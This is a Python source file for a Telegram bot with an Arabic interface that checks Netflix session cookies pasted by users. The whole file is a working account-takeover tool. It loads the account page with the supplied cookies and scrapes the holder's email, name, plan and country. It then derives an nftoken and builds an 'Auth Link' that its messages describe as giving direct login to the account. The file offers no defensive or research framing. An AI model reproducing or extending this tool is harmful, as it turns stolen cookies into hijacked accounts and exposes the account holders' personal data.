import asyncio
import aiohttp
import re
import os
import logging
import json
from urllib.parse import unquote, urlencode
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import ParseMode, InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = os.getenv("BOT_TOKEN", "")

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN غير موجود")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

class Form(StatesGroup):
    waiting_cookies = State()

def main_menu():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🚀 بدء فحص ملف جديد", callback_data="start_check"),
        InlineKeyboardButton("ℹ️ معلومات البوت", callback_data="bot_info")
    )
    return keyboard

def parse_cookies(cookie_str: str) -> dict:
    cookies_dict = {}
    for cookie in cookie_str.split(';'):
        cookie = cookie.strip()
        if '=' in cookie:
            name, value = cookie.split('=', 1)
            cookies_dict[name.strip()] = value.strip()
    return cookies_dict

def generate_nftoken(cookies_dict: dict) -> str:
    if 'nftoken' in cookies_dict:
        return unquote(cookies_dict['nftoken'])

    netflix_id = unquote(cookies_dict.get('NetflixId', ''))
    secure_netflix_id = unquote(cookies_dict.get('SecureNetflixId', ''))

    if not netflix_id:
        return ''

    ct_match = re.search(r'ct=([^&]+)', netflix_id)
    ct_value = ct_match.group(1) if ct_match else netflix_id

    if secure_netflix_id:
        mac_match = re.search(r'mac=([^&]+)', secure_netflix_id)
        mac_value = mac_match.group(1) if mac_match else ''
        if mac_value:
            return f"{ct_value}|{mac_value}"

    return ct_value

async def get_auth_url(session: aiohttp.ClientSession, cookie_str: str, nftoken: str) -> str:
    """توليد Auth Link حقيقي من نتفليكس"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
        'Cookie': cookie_str,
        'Referer': 'https://www.netflix.com/',
        'Content-Type': 'application/json'
    }

    # محاولة من Shakti API
    try:
        # أخذ authUrl من صفحة الحساب
        async with session.get('https://www.netflix.com/YourAccount', headers={
            'User-Agent': headers['User-Agent'],
            'Cookie': cookie_str
        }) as resp:
            if resp.status == 200:
                text = await resp.text()

                # البحث عن authURL كامل في الصفحة
                auth_patterns = [
                    r'authURL["\']?\s*:\s*["\']([^"\']+)["\']',
                    r'authUrl["\']?\s*:\s*["\']([^"\']+)["\']',
                    r'https?://[^"\']*nftoken=[^"\']+',
                ]

                for pattern in auth_patterns:
                    match = re.search(pattern, text)
                    if match:
                        auth_url = match.group(1) if match.groups() else match.group(0)
                        # لو الرابط فيه HTML entities نصلحه
                        auth_url = auth_url.replace('&amp;', '&')
                        if auth_url.startswith('http'):
                            return auth_url
    except:
        pass

    # لو مش لاقيين authUrl في الصفحة، نعمل الرابط يدوياً
    if nftoken:
        return f"https://netflix.com/?nftoken={urlencode({'token': nftoken})[7:]}"

    return f"https://netflix.com/?nftoken={nftoken}"

async def check_netflix_cookie(cookie_str: str) -> dict:
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Cookie': cookie_str,
        'Connection': 'keep-alive',
    }

    result = {
        'valid': False,
        'email': None,
        'name': None,
        'plan': None,
        'country': None,
        'extra_membership': False,
        'member_since': None,
        'nftoken': None,
        'auth_url': None,
        'error': None
    }

    timeout = aiohttp.ClientTimeout(total=12)

    try:
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('https://www.netflix.com/YourAccount', headers=headers) as resp:
                if resp.status == 200:
                    text = await resp.text()

                    email_match = re.search(r'email["\']?\s*:\s*["\']([^"\']+)["\']', text)
                    if email_match:
                        result['email'] = email_match.group(1)

                    name_match = re.search(r'name["\']?\s*:\s*["\']([^"\']+)["\']', text)
                    if name_match:
                        result['name'] = name_match.group(1)

                    plan_match = re.search(r'plan["\']?\s*:\s*["\']([^"\']+)["\']', text)
                    if plan_match:
                        result['plan'] = plan_match.group(1)

                    country_match = re.search(r'country["\']?\s*:\s*["\']([^"\']+)["\']', text)
                    if country_match:
                        result['country'] = country_match.group(1)

                    extra_match = re.search(r'extraMembership["\']?\s*:\s*(true|false)', text, re.I)
                    if extra_match:
                        result['extra_membership'] = extra_match.group(1).lower() == 'true'

                    since_match = re.search(r'memberSince["\']?\s*:\s*["\']([^"\']+)["\']', text)
                    if since_match:
                        result['member_since'] = since_match.group(1)

                    result['valid'] = True

                    # استخراج nftoken
                    cookies_dict = parse_cookies(cookie_str)
                    result['nftoken'] = generate_nftoken(cookies_dict)

                    # توليد auth_url
                    result['auth_url'] = await get_auth_url(session, cookie_str, result['nftoken'])
                else:
                    result['error'] = f"HTTP {resp.status}"
    except asyncio.TimeoutError:
        result['error'] = "انتهت مهلة الفحص"
    except Exception as e:
        result['error'] = str(e)

    return result

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    await message.reply(
        "🎬 **بوت فحص كوكيز نتفليكس**\n\n"
        "اضغط على **بدء الفحص** ثم أرسل الكوكيز.\n\n"
        "بعد الفحص تحصل على:\n"
        "✅ معلومات الحساب\n"
        "🔗 **Auth Links** جاهزة للدخول المباشر",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=main_menu()
    )

@dp.callback_query_handler(lambda c: c.data == 'bot_info')
async def process_bot_info(callback_query: types.CallbackQuery):
    await callback_query.answer()
    await callback_query.message.edit_text(
        "ℹ️ **معلومات البوت**\n\n"
        "هذا البوت يفحص كوكيز نتفليكس ويستخرج:\n"
        "- الإيميل والاسم\n"
        "- الخطة والدولة\n"
        "- **Auth Links** للدخول المباشر\n"
        "- nftoken",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=main_menu()
    )

@dp.callback_query_handler(lambda c: c.data == 'start_check')
async def process_start_check(callback_query: types.CallbackQuery):
    await callback_query.answer()
    await callback_query.message.edit_text(
        "📝 **أرسل الكوكيز الآن**\n\nالصق الكوكيز مباشرة في الرسالة",
        parse_mode=ParseMode.MARKDOWN
    )
    await Form.waiting_cookies.set()

@dp.message_handler(state=Form.waiting_cookies, content_types=types.ContentTypes.TEXT)
async def process_text_cookies(message: types.Message, state: FSMContext):
    cookie_str = message.text.strip()
    processing_msg = await message.reply("⏳ **جاري الفحص...**", parse_mode=ParseMode.MARKDOWN)

    result = await check_netflix_cookie(cookie_str)
    await processing_msg.delete()

    if result['valid']:
        nftoken = result.get('nftoken', '')
        auth_url = result.get('auth_url', '')

        result_text = f"""
✅ **فحص ناجح!**

📧 **الإيميل:** `{result['email'] or 'غير متوفر'}`
👤 **الاسم:** `{result['name'] or 'غير متوفر'}`
💳 **الخطة:** `{result['plan'] or 'غير متوفر'}`
🌍 **الدولة:** `{result['country'] or 'غير متوفر'}`
⭐ **Extra:** `{'✅' if result['extra_membership'] else '❌'}`

━━━━━━━━━━━━━━━

🔑 **nftoken:**
`{nftoken}`

━━━━━━━━━━━━━━━

🔗 **Auth Link (دخول مباشر):**

`{auth_url}`

━━━━━━━━━━━━━━━

⚠️ **اضغط مطولاً على الرابط لنسخه ثم افتحه في المتصفح**
        """
        await message.reply(result_text, parse_mode=ParseMode.MARKDOWN, reply_markup=main_menu())
    else:
        await message.reply(
            f"❌ **فشل الفحص**\n\n**السبب:** `{result['error'] or 'كوكيز غير صالح'}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=main_menu()
        )

    await state.finish()

@dp.message_handler(commands=['cancel'], state='*')
async def cmd_cancel(message: types.Message, state: FSMContext):
    await state.finish()
    await message.reply("❌ **تم الإلغاء**", reply_markup=main_menu())

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
